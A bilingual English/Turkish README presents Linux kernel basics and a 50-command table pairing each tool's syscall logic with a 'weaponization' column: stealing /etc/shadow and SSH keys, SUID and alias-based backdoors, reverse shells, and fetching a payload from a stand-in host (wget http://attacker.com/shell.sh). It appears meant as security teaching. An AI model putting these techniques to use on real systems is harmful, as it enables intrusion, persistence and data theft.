<div align="center">

  <img src="https://capsule-render.vercel.app/render?type=waving&color=0d1117&height=250&section=header&text=THE%20LINUX%20KERNEL%20ARCHIVE&fontSize=45&animation=fadeIn&fontColor=ffffff&desc=System%20Architecture%20%26%20Exploitation%20Masterclass&descFontSize=20" />

  <br>

  <img src="https://img.shields.io/badge/CLEARANCE-TOP_SECRET-red?style=for-the-badge&logo=kalilinux" />
  <img src="https://img.shields.io/badge/KERNEL_ACCESS-RING_0-blue?style=for-the-badge&logo=linux" />
  <img src="https://img.shields.io/badge/STATUS-ACTIVE_WARFARE-success?style=for-the-badge" />
  <img src="https://img.shields.io/badge/DOC_TYPE-BILINGUAL_EN_TR-orange?style=for-the-badge" />

</div>

<br>

> **"To master Linux is not merely to type commands; it is to understand the silent conversation between the User Space and the Kernel. Every keystroke is a request, every prompt is a response from the silicon god."**

<br>

## 🧭 **NAVIGATION / NAVİGASYON**

| 🇺🇸 **[ENGLISH: THE ARCHITECTURAL BLUEPRINT](#-english-the-architectural-blueprint)** | 🇹🇷 **[TÜRKÇE: MİMARİ MÜKEMMELLİK](#-türkçe-mimari-mükemmellik)** |
| :---: | :---: |
| *Kernel, Syscalls, & The Vital 50* | *Çekirdek, Sistem Çağrıları ve Hayati 50* |

<br>

<div id="english-the-architectural-blueprint"></div>

# 🇺🇸 ENGLISH: THE ARCHITECTURAL BLUEPRINT

<hr style="height:4px;border-width:0;color:#238636;background-color:#238636">

### 🧠 I. THE CORE PHILOSOPHY: DECONSTRUCTING THE OS
Linux is an abstraction layer designed to manage hardware securely. To exploit it, you must understand the rules enforced by the CPU.

#### 1. The Privilege Rings (Protection Domains)
The CPU operates in different modes to protect memory.
* **Ring 0 (Kernel Mode):** The "God Mode". The Linux Kernel resides here. It has unrestricted access to Memory, CPU instructions, and I/O ports.
* **Ring 3 (User Mode):** The "Sandbox". Your shell, browser, and tools run here. They cannot touch hardware directly.
* **The Attack Vector:** Exploits often aim to trick the Kernel into executing User Mode code with Ring 0 privileges (**Privilege Escalation**).

#### 2. The Bridge: System Calls (Syscalls)
How does a User Mode program read a file? It cannot. It must ask the Kernel.
* **Mechanism:** The program triggers a **Software Interrupt (Trap)**. The CPU pauses, switches to Ring 0, executes the requested function (e.g., `sys_read`), and returns the result to User Mode.
* **Security Implication:** Security tools (EDR/AV) hook these syscalls to watch you. Hackers use `strace` to watch the syscalls to steal data.

#### 3. The File Descriptor (FD) & Inode Table
* **Philosophy:** "Everything is a file." A socket is a file. A keyboard is a file.
* **Inode:** The metadata container (Permissions, Timestamps, Owner). **It does not hold the filename.**
* **FD:** An integer handle used by the process. `0=STDIN`, `1=STDOUT`, `2=STDERR`.

---

### 🛠️ II. THE VITAL 50: COMMAND ARSENAL & KERNEL LOGIC
*This is not a list of definitions. This is a breakdown of how these tools interact with the system's DNA and how they are weaponized.*

| # | Command | Category | Deep Kernel/Syscall Logic | 💀 Hacker Vision (Weaponization) |
| :--- | :--- | :--- | :--- | :--- |
| **1** | `strace` | **Debug** | Hooks `ptrace()`. Intercepts every interaction between process and kernel. | **The Master Key:** Sniffing cleartext passwords, API keys, and environment variables from running processes. |
| **2** | `lsof` | **Recon** | Parses `/proc/[pid]/fd` and resolves inode mappings. | Finding hidden C2 connections, deleted files still held in memory, or rootkit artifacts. |
| **3** | `ls` | **File** | Triggers `getdents64`. Reads raw directory data blocks. | Detecting **Timestomping** (anti-forensics) by analyzing nanosecond-level timestamps (`ls --full-time`). |
| **4** | `cat` | **File** | `read()` from disk buffer -> `write()` to stdout buffer. | Dumping `/etc/shadow` (hashes) or stealing SSH private keys (`id_rsa`). |
| **5** | `find` | **Recon** | Recursive `stat()` calls on the VFS tree. | **SUID Hunting:** `find / -perm -u=s` locates binaries that auto-elevate privileges to root. |
| **6** | `chmod` | **Perms** | `fchmodat()` modifies the inode mode bits. | Setting the **SUID bit** (`4755`) on `bash` to create a persistent root backdoor. |
| **7** | `chattr` | **Attr** | `ioctl()` to modify Ext4 extended attributes. | Making a backdoor **Immutable** (`+i`). Even `root` cannot delete it without removing the flag first. |
| **8** | `nc` | **Net** | Opens Raw/Stream Sockets (Layer 4). | The **Swiss Army Knife**: Creating Reverse Shells, bind shells, and raw data exfiltration. |
| **9** | `tcpdump` | **Net** | Uses `libpcap` to set NIC to Promiscuous Mode. | Sniffing unencrypted credentials (Telnet/FTP/HTTP) directly from the wire (Layer 2). |
| **10** | `ps` | **Proc** | Reads virtual files in `/proc/[pid]/stat`. | Detecting **Process Hollowing** or spotting malicious processes hiding as generic names (e.g., `[kworker]`). |
| **11** | `kill` | **Proc** | Sends IPC Signals (e.g., `SIGKILL=9`) to Scheduler. | Disabling EDR/Antivirus agents or killing logging daemons to cover tracks. |
| **12** | `grep` | **Data** | Boyer-Moore string search algorithm. | Extracting patterns (IPs, Emails, Passwords) from gigabytes of log files instantly. |
| **13** | `awk` | **Data** | Turing-complete stream processing language. | Automating log parsing to discover internal IP ranges and vulnerable endpoints. |
| **14** | `sudo` | **Priv** | Checks `/etc/sudoers`, calls `setresuid(0)`. | Exploiting `NOPASSWD` misconfigurations to gain instant root access without credentials. |
| **15** | `insmod` | **Kernel** | `init_module()` syscall. Loads code to Ring 0. | Loading a **Kernel Mode Rootkit (LKM)** for total system invisibility and persistence. |
| **16** | `dmesg` | **Sys** | Reads the Kernel Ring Buffer. | Identifying if the system is a VM/Sandbox or analyzing kernel panics for exploit development. |
| **17** | `ssh` | **Net** | Asymmetric Handshake + Symmetric Tunneling. | **Pivot Master:** Using SSH Dynamic Port Forwarding (`-D`) to proxy attack tools into an internal network. |
| **18** | `crontab` | **Auto** | Edits `/var/spool/cron`, handled by daemon. | **Persistence:** Scheduling a reverse shell or malware downloader to run every reboot (`@reboot`). |
| **19** | `ip` | **Net** | Communicates via Netlink Protocol. | Analyzing routing tables (`ip route`) to find paths to other subnets for Lateral Movement. |
| **20** | `dd` | **Disk** | Block-level copying via `read`/`write`. | **Anti-Forensics:** Wiping a drive (`if=/dev/zero`) or cloning a partition for offline analysis. |
| **21** | `touch` | **File** | `utimensat()` syscall updates timestamps. | **Timestomping:** Changing a malware's creation date to match system files (e.g., 2018) to blend in. |
| **22** | `history` | **Shell** | Reads `~/.bash_history` from memory/disk. | **Gold Mine:** Finding passwords, IP addresses, or API keys typed by previous administrators. |
| **23** | `whoami` | **Priv** | Calls `geteuid()` (Effective User ID). | Verifying if a privilege escalation exploit worked (Target: `root`). |
| **24** | `mount` | **Sys** | `mount()` syscall attaches filesystems. | Accessing hidden partitions or mounting a USB drive to extract data physically. |
| **25** | `export` | **Env** | Modifies environment variables for child procs. | **Library Hijacking:** Setting `LD_PRELOAD` to force a binary to load a malicious `.so` library. |
| **26** | `w` | **Recon** | Reads `/var/run/utmp`. | Checking if other admins are logged in to avoid detection during an operation. |
| **27** | `last` | **Recon** | Reads `/var/log/wtmp`. | Analyzing login patterns to determine the best time for an attack (when admins are asleep). |
| **28** | `id` | **Priv** | Reads UID/GID and Group memberships. | Checking if the current user is in the `docker` or `lxd` group (Instant Root vectors). |
| **29** | `sed` | **Data** | Stream Editor using Regex. | Modifying configuration files (e.g., `/etc/ssh/sshd_config`) on the fly to allow root login. |
| **30** | `uname` | **Sys** | `uname()` syscall. | Identifying Kernel version (`-r`) to search for specific exploits (e.g., DirtyCOW). |
| **31** | `df` | **Sys** | `statfs()` syscall. | Checking available disk space before exfiltrating massive databases. |
| **32** | `du` | **Sys** | Recursively sums file sizes. | Finding where the valuable data is hidden by looking for large directories. |
| **33** | `tar` | **Data** | Archives file streams. | Bundling thousands of stolen files into a single archive for easier exfiltration. |
| **34** | `curl` | **Net** | Uses `libcurl` (HTTP/FTP/SMB). | Downloading exploits from GitHub or communicating with a C2 server via API. |
| **35** | `wget` | **Net** | Non-interactive downloader. | Fetching payloads to the target machine (`wget http://attacker.com/shell.sh`). |
| **36** | `openssl` | **Crypto** | Crypto library interface. | Generating self-signed certs for HTTPS servers or decrypting stolen SSL traffic. |
| **37** | `base64` | **Data** | Encoding utility. | Obfuscating payloads to bypass basic signature-based Antivirus detection. |
| **38** | `diff` | **Data** | Compares files line-by-line. | Identifying changes made to config files (`/etc/passwd`) to spot intrusion or verify persistence. |
| **39** | `scp` | **Net** | Secure Copy (SSH protocol). | Exfiltrating sensitive data out of the network over an encrypted channel. |
| **40** | `systemctl`| **Sys** | Communicates with D-Bus / systemd. | Disabling firewalls (`ufw`) or creating malicious services for auto-start. |
| **41** | `passwd` | **Priv** | Updates `/etc/shadow` (needs suid). | Changing the root password to lock out legitimate administrators (Lockout). |
| **42** | `su` | **Priv** | Switches User ID via PAM. | Lateral Movement: Pivoting from a compromised web user to a database user. |
| **43** | `umask` | **Perms** | Sets default permission mask. | Configuring the shell so that every file created (e.g., a backdoor) is world-writable. |
| **44** | `head/tail`| **Data** | Reads start/end of streams. | Monitoring logs in real-time (`tail -f /var/log/auth.log`) to watch for defenders. |
| **45** | `alias` | **Shell** | Command substitution. | Creating Trojans: `alias sudo='path/to/malicious_script'`. |
| **46** | `ss` | **Net** | Netlink Protocol (Modern netstat). | Faster socket analysis to spot "Establish" connections to suspicious foreign IPs. |
| **47** | `iptables` | **Net** | Kernel Netfilter hooks. | Setting up port forwarding or blocking logging servers to blind the SOC team. |
| **48** | `lsmod` | **Kernel** | Reads `/proc/modules`. | Checking for loaded security modules (SELinux, AppArmor) or existing Rootkits. |
| **49** | `top` | **Proc** | Real-time system metrics. | Monitoring CPU usage to ensure crypto-miners aren't crashing the server. |
| **50** | `uptime` | **Sys** | Reads `/proc/uptime`. | Determining system stability and how long a server has been unpatched. |

<br><br>

<div id="türkçe-mimari-mükemmellik"></div>

# 🇹🇷 TÜRKÇE: MİMARİ MÜKEMMELLİK

<hr style="height:4px;border-width:0;color:#bd2c00;background-color:#bd2c00">

### 🧠 I. ÇEKİRDEK FELSEFESİ: İŞLETİM SİSTEMİNİ PARÇALAMAK
Linux, donanımı güvenli bir şekilde yönetmek için tasarlanmış bir soyutlama katmanıdır. Onu sömürmek için işlemcinin (CPU) koyduğu kuralları anlamalısınız.

#### 1. Yetki Halkaları (Koruma Alanları)
CPU, belleği korumak için farklı modlarda çalışır.
* **Ring 0 (Kernel Modu):** "Tanrı Modu". Linux Çekirdeği burada yaşar. Belleğe, CPU komutlarına ve I/O portlarına sınırsız erişimi vardır.
* **Ring 3 (Kullanıcı Modu):** "Kum Havuzu" (Sandbox). Shell, tarayıcı ve araçlarınız burada çalışır. Donanıma doğrudan dokunamazlar.
* **Saldırı Vektörü:** Exploit'lerin çoğu, Kernel'ı kandırarak Kullanıcı Modu kodunu Ring 0 yetkileriyle çalıştırmayı hedefler (**Yetki Yükseltme**).

#### 2. Köprü: Sistem Çağrıları (Syscalls)
Kullanıcı Modundaki bir program dosyayı nasıl okur? Doğrudan okuyamaz. Kernel'dan istemek zorundadır.
* **Mekanizma:** Program bir **Yazılım Kesintisi (Trap)** tetikler. CPU duraklar, Ring 0'a geçer, istenen fonksiyonu (örn: `sys_read`) çalıştırır ve sonucu Kullanıcı Moduna döndürür.
* **Güvenlik Anlamı:** Güvenlik araçları (EDR/AV) sizi izlemek için bu çağrılara kanca atar (hook). Hackerlar ise veri çalmak için `strace` ile bu trafiği izler.

#### 3. Dosya Tanımlayıcı (FD) ve Inode Tablosu
* **Felsefe:** "Her şey bir dosyadır." Soket bir dosyadır. Klavye bir dosyadır.
* **Inode:** Meta veri konteyneridir (İzinler, Zaman Damgaları, Sahip). **Dosya ismini barındırmaz.**
* **FD:** İşlem tarafından kullanılan sayısal tutamaçtır. `0=STDIN`, `1=STDOUT`, `2=STDERR`.

---

### 🛠️ II. HAYATİ 50: KOMUT CEPHANELİĞİ VE KERNEL MANTIĞI
*Bu bir sözlük tanım listesi değildir. Bu, araçların sistemin DNA'sıyla nasıl etkileşime girdiğinin ve nasıl silahlaştırıldığının analizidir.*

| # | Komut | Kategori | Derin Kernel/Syscall Mantığı | 💀 Hacker Vizyonu (Silahlaştırma) |
| :--- | :--- | :--- | :--- | :--- |
| **1** | `strace` | **Debug** | `ptrace()` kancası atar. İşlem ve kernel arasındaki her etkileşimi yakalar. | **Anahtar:** Çalışan işlemlerden şifrelenmemiş parolaları, API anahtarlarını çalmak. |
| **2** | `lsof` | **Keşif** | `/proc/[pid]/fd` ayrıştırır ve inode eşleşmelerini çözer. | Gizli C2 bağlantılarını, silinmiş ama bellekte yaşayan dosyaları veya rootkit izlerini bulmak. |
| **3** | `ls` | **Dosya** | `getdents64` çağrısını tetikler. Ham dizin veri bloklarını okur. | **Timestomping** (anti-forensics) tespiti için nanosaniye seviyesinde zaman analizi (`ls --full-time`). |
| **4** | `cat` | **Dosya** | Disk tamponundan `read()` -> stdout tamponuna `write()`. | `/etc/shadow` (hashler) dökümü veya SSH özel anahtarlarını (`id_rsa`) çalmak. |
| **5** | `find` | **Keşif** | VFS ağacında özyinelemeli `stat()` çağrıları yapar. | **SUID Avı:** `find / -perm -u=s` komutuyla kendini root yapan dosyaları bulmak. |
| **6** | `chmod` | **İzin** | `fchmodat()` ile inode mod bitlerini değiştirir. | Kalıcı bir root kapısı (backdoor) oluşturmak için `bash` üzerine **SUID biti** (`4755`) eklemek. |
| **7** | `chattr` | **Öznitelik** | Ext4 genişletilmiş özniteliklerini değiştirmek için `ioctl()` kullanır. | Backdoor'u **Değiştirilemez** (`+i`) yapmak. Root bile bayrağı kaldırmadan dosyayı silemez. |
| **8** | `nc` | **Ağ** | Ham/Akış Soketleri açar (Katman 4). | **İsviçre Çakısı:** Reverse Shell, Bind Shell oluşturmak ve ham veri sızdırmak. |
| **9** | `tcpdump` | **Ağ** | NIC'i Promiscuous Mod'a almak için `libpcap` kullanır. | Şifrelenmemiş kimlik bilgilerini (Telnet/FTP/HTTP) doğrudan kablodan (Katman 2) yakalamak. |
| **10** | `ps` | **İşlem** | `/proc/[pid]/stat` içindeki sanal dosyaları okur. | **Process Hollowing** tespiti veya genel isimler (örn: `[kworker]`) arkasına saklanan zararlıları bulmak. |
| **11** | `kill` | **İşlem** | Zamanlayıcıya IPC Sinyalleri (örn: `SIGKILL=9`) gönderir. | EDR/Antivirüs ajanlarını devre dışı bırakmak veya log tutan servisleri kapatmak. |
| **12** | `grep` | **Veri** | Boyer-Moore dize arama algoritması. | Gigabaytlarca log dosyasından desenleri (IP, Email, Parola) anında süzmek. |
| **13** | `awk` | **Veri** | Turing-tamamlanmış akış işleme dili. | İç IP aralıklarını ve zafiyetli uç noktaları keşfetmek için log analizini otomatize etmek. |
| **14** | `sudo` | **Yetki** | `/etc/sudoers` kontrolü, `setresuid(0)` çağrısı. | `NOPASSWD` hatalarını sömürerek parola girmeden anında root olmak. |
| **15** | `insmod` | **Kernel** | `init_module()` çağrısı. Kodu Ring 0'a yükler. | Tam sistem görünmezliği ve kalıcılık için **Kernel Modu Rootkit (LKM)** yüklemek. |
| **16** | `dmesg` | **Sis** | Kernel Ring Buffer'ı (Döngüsel Tampon) okur. | Sistemin VM/Sandbox olup olmadığını anlamak veya exploit geliştirirken kernel hatalarını izlemek. |
| **17** | `ssh` | **Ağ** | Asimetrik El Sıkışma + Simetrik Tünelleme. | **Pivot Ustası:** Saldırı trafiğini iç ağa yönlendirmek için Dinamik Port Yönlendirme (`-D`) kullanmak. |
| **18** | `crontab` | **Oto** | `/var/spool/cron` düzenler, daemon tarafından yönetilir. | **Kalıcılık:** Her yeniden başlatmada (`@reboot`) çalışan bir malware indirici veya reverse shell kurmak. |
| **19** | `ip` | **Ağ** | Netlink Protokolü ile iletişim kurar. | Yanal Hareket (Lateral Movement) için diğer alt ağlara giden yolları (`ip route`) analiz etmek. |
| **20** | `dd` | **Disk** | `read`/`write` ile blok seviyesinde kopyalama. | **Anti-Forensics:** Diski güvenli silmek (`if=/dev/zero`) veya analiz için bölüm imajı almak. |
| **21** | `touch` | **Dosya** | `utimensat()` çağrısı ile zaman damgalarını günceller. | **Timestomping:** Malware'in oluşturulma tarihini sistem dosyalarıyla (örn: 2018) eşleyerek gizlemek. |
| **22** | `history` | **Shell** | Bellekten/diskten `~/.bash_history` okur. | **Altın Madeni:** Önceki yöneticilerin yazdığı parolaları, IP adreslerini veya API anahtarlarını bulmak. |
| **23** | `whoami` | **Yetki** | `geteuid()` (Etkin Kullanıcı Kimliği) çağırır. | Yetki yükseltme exploit'inin çalışıp çalışmadığını doğrulamak (Hedef: `root`). |
| **24** | `mount` | **Sis** | `mount()` çağrısı dosya sistemlerini bağlar. | Gizli bölümlere erişmek veya veri çalmak için fiziksel olarak USB bellek bağlamak. |
| **25** | `export` | **Ortam** | Alt işlemler için ortam değişkenlerini değiştirir. | **Kütüphane Kaçırma:** `LD_PRELOAD` ile bir uygulamanın zararlı `.so` kütüphanesi yüklemesini sağlamak. |
| **26** | `w` | **Keşif** | `/var/run/utmp` dosyasını okur. | Operasyon sırasında yakalanmamak için başka yöneticilerin o an bağlı olup olmadığını kontrol etmek. |
| **27** | `last` | **Keşif** | `/var/log/wtmp` dosyasını okur. | Saldırı için en uygun zamanı (yöneticilerin uyuduğu saatleri) belirlemek için giriş analizleri. |
| **28** | `id` | **Yetki** | UID/GID ve Grup üyeliklerini okur. | Kullanıcının `docker` veya `lxd` grubunda olup olmadığını kontrol etmek (Anında Root yolları). |
| **29** | `sed` | **Veri** | Regex kullanan Akış Düzenleyici. | Root girişine izin vermek için konfigürasyon dosyalarını (örn: `/etc/ssh/sshd_config`) anlık değiştirmek. |
| **30** | `uname` | **Sis** | `uname()` sistem çağrısı. | Spesifik exploitleri (örn: DirtyCOW) aramak için Kernel versiyonunu (`-r`) belirlemek. |
| **31** | `df` | **Sis** | `statfs()` sistem çağrısı. | Devasa veritabanlarını sızdırmadan önce diskte yer olup olmadığını kontrol etmek. |
| **32** | `du` | **Sis** | Dosya boyutlarını özyinelemeli toplar. | Büyük dizinleri bularak değerli verilerin nerede saklandığını keşfetmek. |
| **33** | `tar` | **Veri** | Dosya akışlarını arşivler. | Binlerce çalıntı dosyayı daha kolay sızdırmak için tek bir arşivde toplamak. |
| **34** | `curl` | **Ağ** | `libcurl` kullanır (HTTP/FTP/SMB). | GitHub'dan exploit indirmek veya API üzerinden C2 sunucusuyla haberleşmek. |
| **35** | `wget` | **Ağ** | Etkileşimsiz indirici. | Hedef makineye payload çekmek (`wget http://attacker.com/shell.sh`). |
| **36** | `openssl` | **Kripto** | Kripto kütüphane arayüzü. | HTTPS sunucuları için sahte sertifika üretmek veya çalınan SSL trafiğini çözmek. |
| **37** | `base64` | **Veri** | Kodlama aracı. | Temel imza tabanlı Antivirüs tespitini atlatmak için payload'ları karmaşıklaştırmak (obfuscation). |
| **38** | `diff` | **Veri** | Dosyaları satır satır karşılaştırır. | Sızma veya kalıcılık izlerini görmek için config dosyalarında yapılan değişiklikleri analiz etmek. |
| **39** | `scp` | **Ağ** | Güvenli Kopyalama (SSH protokolü). | Hassas verileri ağ dışına şifreli bir kanal üzerinden çıkarmak. |
| **40** | `systemctl`| **Sis** | D-Bus / systemd ile haberleşir. | Güvenlik duvarlarını (`ufw`) kapatmak veya otomatik başlayan zararlı servisler oluşturmak. |
| **41** | `passwd` | **Yetki** | `/etc/shadow` günceller (suid gerekir). | Meşru yöneticileri dışarıda bırakmak için root parolasını değiştirmek (Lockout). |
| **42** | `su` | **Yetki** | PAM üzerinden Kullanıcı ID değiştirir. | Yanal Hareket: Ele geçirilen web kullanıcısından veritabanı kullanıcısına geçiş. |
| **43** | `umask` | **İzin** | Varsayılan izin maskesini ayarlar. | Oluşturulan her dosyanın (örn: backdoor) herkes tarafından yazılabilir olmasını sağlamak. |
| **44** | `tail` | **Veri** | Akışın sonunu okur. | Savunmacıları izlemek için logları gerçek zamanlı takip etmek (`tail -f /var/log/auth.log`). |
| **45** | `alias` | **Shell** | Komut ikamesi. | Trojan Oluşturma: `alias sudo='path/to/malicious_script'` ile sudo komutunu zehirlemek. |
| **46** | `ss` | **Ağ** | Netlink Protokolü (Modern netstat). | Şüpheli yabancı IP'lere giden "Establish" bağlantıları tespit etmek için hızlı soket analizi. |
| **47** | `iptables` | **Ağ** | Kernel Netfilter kancaları. | Port yönlendirme yapmak veya SOC ekibini kör etmek için log sunucularını engellemek. |
| **48** | `lsmod` | **Kernel** | `/proc/modules` okur. | Yüklü güvenlik modüllerini (SELinux, AppArmor) veya var olan Rootkitleri kontrol etmek. |
| **49** | `top` | **İşlem** | Gerçek zamanlı sistem metrikleri. | Crypto-miner'ların sunucuyu çökertmemesi için CPU kullanımını izlemek. |
| **50** | `uptime` | **Sis** | `/proc/uptime` okur. | Sistemin stabilitesini ve sunucunun ne kadar süredir yamasız çalıştığını belirlemek. |

<br>

<div align="center">
  <img src="https://capsule-render.vercel.app/render?type=soft&color=0d1117&height=100&section=footer&text=SUPREME%20MASTER%20REFERENCE&fontSize=25&animation=fadeIn&fontColor=ffffff" />
  <br>
  <i>"In the code we trust, in the kernel we reside."</i>
</div>